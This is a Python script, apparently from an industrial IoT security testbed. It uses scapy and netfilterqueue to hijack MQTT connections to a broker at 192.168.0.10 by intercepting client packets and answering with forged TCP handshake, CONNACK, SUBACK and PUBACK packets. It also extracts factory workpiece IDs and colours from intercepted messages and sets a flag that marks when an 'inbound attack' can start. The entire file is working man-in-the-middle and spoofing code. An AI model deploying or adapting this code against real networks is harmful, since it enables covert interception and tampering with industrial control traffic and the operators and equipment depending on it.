from scapy.contrib import mqtt
from scapy import all as scapy
import json
import netfilterqueue

id_, type_, start_inbound_attack = None, None, None


def extract_packet_attributes(packet, has_mqtt=True):
    """Function to extract real time dynamic info/attr from IP, TCP, MQTT layers
     Info such as ip src & dst, TCP src & dst, TCP seq & ack, MQTT msg ID
     """
    src_ip = packet[scapy.IP].src
    dst_ip = packet[scapy.IP].dst
    src_port = int(packet[scapy.TCP].sport)
    dst_port = int(packet[scapy.TCP].dport)
    tcp_seq = int(packet[scapy.TCP].seq)
    tcp_ack = int(packet[scapy.TCP].ack)
    tcp_payload_len = len(packet[scapy.TCP].payload)  # the tcp paylod len is equivalent to len of entire MQTT packet
    mqtt_msgid = None
    if has_mqtt == True:
        try:
            mqtt_msgid = int(packet[mqtt.MQTTPublish].msgid)
        except IndexError:
            mqtt_msgid = int(packet[mqtt.MQTTSubscribe].msgid)

    return [src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid]

def packet_process(packet):
    packet = scapy.IP(packet.get_payload())
    # packet.show()

    if packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet[scapy.TCP].flags == "S":
        # what to do to sync packets
        print("TCP S packet received")
        packet_attr = extract_packet_attributes(packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, _ = packet_attr
        tcp3way_ack_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+1, flags="SA")
        scapy.send(tcp3way_ack_resp)
        print("TCP Ack sent for 3way")

    elif packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet.haslayer(mqtt.MQTTConnect):
        packet_attr = extract_packet_attributes(packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, _ = packet_attr
        # Send a forged PUBACK to sender
        forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                        ack=tcp_seq + tcp_payload_len,
                                                                        flags="PA") / mqtt.MQTT(
            type=2) / mqtt.MQTTConnack()
        scapy.send(forged_mqtt_resp)
        print("Forged packet sent for ConnAck")

    elif packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet.haslayer(
            mqtt.MQTTSubscribe):
        packet_attr = extract_packet_attributes(packet, True)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr

        if mqtt_msgid == 1:
            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                            ack=tcp_seq + tcp_payload_len,
                                                                            flags="PA") / mqtt.MQTT(
                type=9, QOS=1) / mqtt.MQTTSuback(msgid=1)
            scapy.send(forged_mqtt_resp)


        else:
            raw_mqtt_load = "90 03 00 02 01 90 03 00 03 01 90 03 00 04 01 90 03 00 05 01 90 03 00 06 01 90 03 00 07 01 40 02 00 08"
            raw_mqtt_load = bytes.fromhex(raw_mqtt_load)
            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                            ack=tcp_seq + tcp_payload_len,
                                                                            flags="PA") / scapy.Raw(load=raw_mqtt_load)
            scapy.send(forged_mqtt_resp)
            # print("Forged packet sent for SubAck")

    elif packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet.haslayer(mqtt.MQTTPublish):

        packet_attr = extract_packet_attributes(packet, True)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr
        # Send a forged PUBACK to sender
        forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+tcp_payload_len, flags="PA") / mqtt.MQTT(
            type=4, QOS=1) / mqtt.MQTTPuback(msgid=mqtt_msgid)
        scapy.send(forged_mqtt_resp)
        # print("Forged packet sent for PubAck")

        # check if the packet has PUBLISH packets of interest
        global id_, type_, start_inbound_attack

        topic = packet[mqtt.MQTTPublish].topic
        value = packet[mqtt.MQTTPublish].value

        if topic == b"f/i/state/dsi":
            dsi_payload = value.decode("utf-8", "ignore")
            dsi_payload = json.loads(dsi_payload)
            if dsi_payload["active"] == 0 and dsi_payload["code"] == 0:
                print(dsi_payload)
                start_inbound_attack = True

        if topic == b"f/i/nfc/ds":
            nfc_payload = value.decode("utf-8", "ignore")
            nfc_payload = json.loads(nfc_payload)
            # print(nfc_payload)

            id_ = nfc_payload["workpiece"]["id"]
            if nfc_payload["workpiece"]["type"] != "NONE":
                type_ = nfc_payload["workpiece"]["type"]
            print("Captured ordered WP. Color is %s and ID is %s" % (type_, id_))



    else:
        print("No conditions matched")


ss = netfilterqueue.NetfilterQueue()
ss.bind(22, packet_process)
ss.run()